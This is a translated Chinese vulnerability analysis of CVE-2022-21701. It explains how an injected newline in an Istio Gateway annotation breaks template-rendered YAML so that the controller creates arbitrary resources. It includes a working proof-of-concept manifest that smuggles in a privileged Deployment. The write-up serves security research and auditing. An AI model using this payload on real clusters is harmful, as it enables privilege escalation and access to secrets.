@@ -1,0 +1,238 @@
+# Go template 遇上 yaml 反序列化 CVE-2022-21701 分析
+##### 译文声明
+本文是翻译文章
+译文仅供参考，具体内容表达以及含义原文为准。
+作者：lazydog
+## 前言
+本文对 CVE-2022-21701 istio 提权漏洞进行分析，介绍 go template 遇到 yaml 反序列化两者相结合时造成的漏洞，类似于
+“模版注入” 但不是单一利用了模版解析引擎特性，而是结合 yaml 解析后造成了“变量覆盖”，最后使 istiod gateway controller
+创建非预期的 k8s 资源。
+## k8s validation
+在对漏洞根因展开分析前，我们先介绍 k8s 如何对各类资源中的属性进行有效性的验证。
+首先是常见的 k8s 资源，如 `Pod` 它使用了 apimachinery 提供的 validation 的功能，其中最常见的 pod name
+就使用遵守 DNS RFC 1123 及 DNS RFC 1035 验证 label 的实现，其他一些值会由在 controller 中实现
+validation 来验证，这样的好处是可以帮助我们避免一部分的 bug 甚至是一些安全漏洞。
+    const dns1123LabelFmt string = "[a-z0-9]([-a-z0-9]*[a-z0-9])?"
+    const DNS1123LabelMaxLength int = 63
+    var dns1123LabelRegexp = regexp.MustCompile("^" + dns1123LabelFmt + "$")
+    func IsDNS1123Label(value string) []string {
+        var errs []string
+        if len(value) > DNS1123LabelMaxLength {
+            errs = append(errs, MaxLenError(DNS1123LabelMaxLength))
+        }
+        if !dns1123LabelRegexp.MatchString(value) {
+            errs = append(errs, RegexError(dns1123LabelErrMsg, dns1123LabelFmt, "my-name", "123-abc"))
+        }
+        return errs
+    }
+k8s 还提供了 CRD (Custom Resource Definition) 自定义资源来方便扩展 k8s apiserver, 这部分也可以使用
+OpenAPI schema 来规定资源中输入输出数据类型及各种约束限制，除此之外还提供了 x-kubernetes-validations
+的功能，用户可以使用 `CEL` 扩展这部分的约束限制。
+下面的 yaml 就描述了定时任务创建 `Pod` 的 CRD，使用正则验证了 Cron 表达式
+    apiVersion: apiextensions.k8s.io/v1
+    kind: CustomResourceDefinition
+    metadata:
+      name: crontabs.stable.example.com
+    spec:
+      group: stable.example.com
+      versions:
+        - name: v1
+          served: true
+          storage: true
+          schema:
+            # openAPIV3Schema is the schema for validating custom objects.
+            openAPIV3Schema:
+              type: object
+              properties:
+                spec:
+                  type: object
+                  properties:
+                    cronSpec:
+                      type: string
+                      pattern: '^(\d+|\*)(/\d+)?(\s+(\d+|\*)(/\d+)?){4}$'
+                    image:
+                      type: string
+                    replicas:
+                      type: integer
+                      minimum: 1
+                      maximum: 10
+      scope: Namespaced
+      names:
+        plural: crontabs
+        singular: crontab
+        kind: CronTab
+        shortNames:
+        - ct
+另外还有一类值是无法（不方便）验证的，各个资源的注解字段 annotations 及 labels，注解会被各 controller 或 webhook
+动态的去添加。
+## 根因分析
+istio gateway controller 使用 informer 机制 watch 对应资源 GVR 的 k8s apiserver
+的端点，在资源变更时做出相应的动作，而当用户提交 kind 为 `Gateway` 的资源时，istio gateway controller
+会对`Gateway`资源进行解析处理并转化为 `Service` 及 `Depolyment` 两种资源，再通过 `client-go` 提交两种资源至
+k8s apiserver.
+    func (d *DeploymentController) configureIstioGateway(log *istiolog.Scope, gw gateway.Gateway) error {
+        if !isManaged(&gw.Spec) {
+            log.Debug("skip unmanaged gateway")
+            return nil
+        }
+        log.Info("reconciling")
+        svc := serviceInput{Gateway: gw, Ports: extractServicePorts(gw)}
+        if err := d.ApplyTemplate("service.yaml", svc); err != nil {
+            return fmt.Errorf("update service: %v", err)
+        }
+    ...
+    }
+分析`service.yaml`模版内容，发现了在位于最后一行的 `type` 取值来自于 `Annotations` ，上文也介绍到了 k8s
+apiserver 会做 validation 的操作，istio gateway crd
+也同样做了校验，但`Annotations`这部分不会进行检查，就可以利用不进行检查这一点注入一些奇怪的字符。
+    apiVersion: v1
+    kind: Service
+    metadata:
+      annotations:
+        {{ toYamlMap .Annotations | nindent 4 }}
+      labels:
+        {{ toYamlMap .Labels
+          (strdict "gateway.istio.io/managed" "istio.io-gateway-controller")
+          | nindent 4}}
+      name: {{.Name}}
+      namespace: {{.Namespace}}
+    ...
+    spec:
+    ...
+      {{- if .Spec.Addresses }}
+      loadBalancerIP: {{ (index .Spec.Addresses 0).Value}}
+      {{- end }}
+      type: {{ index .Annotations "networking.istio.io/service-type" | default "LoadBalancer" }}
+众所周知 go template 是可以自行带 `\n` ，如果在 `networking.istio.io/service-type`注解中加入
+`\n`就可以控制 `yaml` 文件，接着我们用单测文件进行 debug 测试验证猜想。
+在`pilot/pkg/config/kube/gateway/deploymentcontroller_test.go`中对注解进行修改，加入`\n`注入`apiVersion`及`kind`。
+在 `configureIstioGateway`处下断，跟进到
+`ApplyTemplate`步入直接看模版的渲染结果，经过渲染后的模版，可以发现在注解中注入的`\n`模版经过渲染后对`yaml`文件结构已经造成了“破坏”，因为众所周知的`yaml`使用缩进来控制数据结构。
+继续往下跟进，当`yaml.Unmarshal`进行反序列化后，可以观察到 `kind`已经被改为
+`Pod`，说明可以进行覆盖，再往下跟进观察到最后反序列化后的数据由 `patcher` 进行提交，而 `patcher`的实现使用了 `client-go` 中的 `Dynamic` 接口，该接口会按照传入的
+`GVR`使用`client.makeURLSegments`函数生成访问的端点，又由于我们此前的操作覆盖了 `yaml` 文件中的`GVK`
+所以其对应的`GVR`也跟着变动。
+    # before inject LF
+    GVK:              |
+    apiVersion: v1    |
+    kind: Service     |
+    GVR:              |
+    /api/v1/services  |
+    ------------------           ||
+           ︾
+    # after inject LF
+    GVK:             |
+    apiVersion: v1   |
+    kind: Pod        |
+    GVR:             |
+    /api/v1/pods     |
+    -----------------    
+patcher 实现如下
+    patcher: func(gvr schema.GroupVersionResource, name string, namespace string, data []byte, subresources ...string) error {
+        c := client.Dynamic().Resource(gvr).Namespace(namespace)
+        t := true
+        _, err := c.Patch(context.Background(), name, types.ApplyPatchType, data, metav1.PatchOptions{
+            Force:        &t,
+            FieldManager: ControllerName,
+        }, subresources...)
+        return err
+    }
+    func (c *dynamicResourceClient) Patch(ctx context.Context, name string, pt types.PatchType, data []byte, opts metav1.PatchOptions, subresources ...string) (*unstructured.Unstructured, error) {
+        if len(name) == 0 {
+            return nil, fmt.Errorf("name is required")
+        }
+        result := c.client.client.
+            Patch(pt).
+            AbsPath(append(c.makeURLSegments(name), subresources...)...).
+            Body(data).
+            SpecificallyVersionedParams(&opts, dynamicParameterCodec, versionV1).
+            Do(ctx)
+    ...
+    }
+## 漏洞复现
+整理漏洞利用的思路
+  1. 具备创建 Gateway 资源的权限
+  2. 在注解 `networking.istio.io/service-type`中注入其他资源的 `yaml`
+  3. 提交恶意 yaml 等待 controller 创建完资源，漏洞利用完成
+初始化环境，并创建相应的 clusterrole 和 binding
+    curl -L https://istio.io/downloadIstio | ISTIO_VERSION=1.12.0 TARGET_ARCH=x86_64 sh -    istioctl x precheck
+    istioctl install --set profile=demo -y
+    kubectl create namespace istio-ingress
+    kubectl create -f - << EOF
+    apiVersion: rbac.authorization.k8s.io/v1
+    kind: ClusterRole
+    metadata:
+      name: gateways-only-create
+    rules:
+    - apiGroups: ["gateway.networking.k8s.io"]
+      resources: ["gateways"]
+      verbs: ["create"]
+    ---    apiVersion: rbac.authorization.k8s.io/v1
+    kind: ClusterRoleBinding
+    metadata:
+      name: test-gateways-only-create
+    subjects:
+    - kind: User
+      name: test
+      apiGroup: rbac.authorization.k8s.io
+    roleRef:
+      kind: ClusterRole
+      name: gateways-only-create
+      apiGroup: rbac.authorization.k8s.io
+    EOF
+    kubectl get crd gateways.gateway.networking.k8s.io || { kubectl kustomize "github.com/kubernetes-sigs/gateway-api/config/crd?ref=v0.4.0" | kubectl apply -f -; }
+构造并创建带有恶意 payload 注解`yaml`文件，这里在注解中注入了可创建特权容器的 `Deployment`
+    kubectl --as test create -f - << EOF
+    apiVersion: gateway.networking.k8s.io/v1alpha2
+    kind: Gateway
+    metadata:
+      name: gateway
+      namespace: istio-ingress
+      annotations:
+        networking.istio.io/service-type: |-          "LoadBalancer"
+          apiVersion: apps/v1
+          kind: Deployment
+          metadata:
+            name: pwned-deployment
+            namespace: istio-ingress
+          spec:
+            selector:
+              matchLabels:
+                app: nginx
+            replicas: 1
+            template:
+              metadata:
+                labels:
+                  app: nginx
+              spec:
+                containers:
+                - name: nginx
+                  image: nginx:1.14.3
+                  ports:
+                  - containerPort: 80
+                  securityContext:
+                    privileged: true
+    spec:
+      gatewayClassName: istio
+      listeners:
+      - name: default
+        hostname: "*.example.com"
+        port: 80
+        protocol: HTTP
+        allowedRoutes:
+          namespaces:
+            from: All
+    EOF
+完成攻击，创建了恶意的 pod
+## 溢出了哪些权限
+根据 gateway controller 使用的 istiod 的 serviceaccount，去列具备哪些权限。
+    kubectl --token="istiod sa token here" auth can-i --list
+根据上图，可以发现溢出了的权限还是非常大的，其中就包含了 `secrets` 还有上文利用的 `deployments` 权限，涵盖至少 `istiod-clusterrole-istio-system` 和`istiod-gateway-controller-istio-system` 两个
+`ClusterRole` 的权限。
+## 总结
+审计这类 controller 时也可以关注下不同 lexer scan/parser 的差异，说不定会有意外收获。
+## 参考
+[Extend the Kubernetes API with
+CustomResourceDefinitions](https://kubernetes.io/docs/tasks/extend-kubernetes/custom-resources/custom-resource-definitions/#validation)
+[Patch
+commit](https://github.com/istio/istio/pull/36197/commits/2aa1cbe02c968483f7aa5a32c6f0c0efe484c425)
